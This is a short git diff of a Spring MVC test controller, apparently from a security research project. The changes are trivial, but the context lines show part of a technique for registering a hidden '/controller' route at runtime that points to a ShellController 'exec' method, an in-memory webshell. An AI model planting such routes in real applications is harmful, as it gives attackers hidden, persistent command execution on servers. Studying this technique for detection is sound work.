@@ -1,5 +1,6 @@
 package cn.safe6.controller;
 
+import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Controller;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.context.ContextLoader;
@@ -20,7 +21,6 @@ public class TestController {
 
 
 
-
     @RequestMapping("/index")
     public String test(){
         System.out.println(1);
@@ -32,7 +32,6 @@ public class TestController {
         WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
         //WebApplicationContext context1 = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
         RequestMappingHandlerMapping handlerMapping = context.getBean(RequestMappingHandlerMapping.class);
-
         RequestMappingInfo requestMappingInfo = new RequestMappingInfo(new PatternsRequestCondition("/controller"),null,null,null,null,null,null);
         Class shell = Class.forName("cn.safe6.controller.ShellController");
         Method method = shell.getMethod("exec");
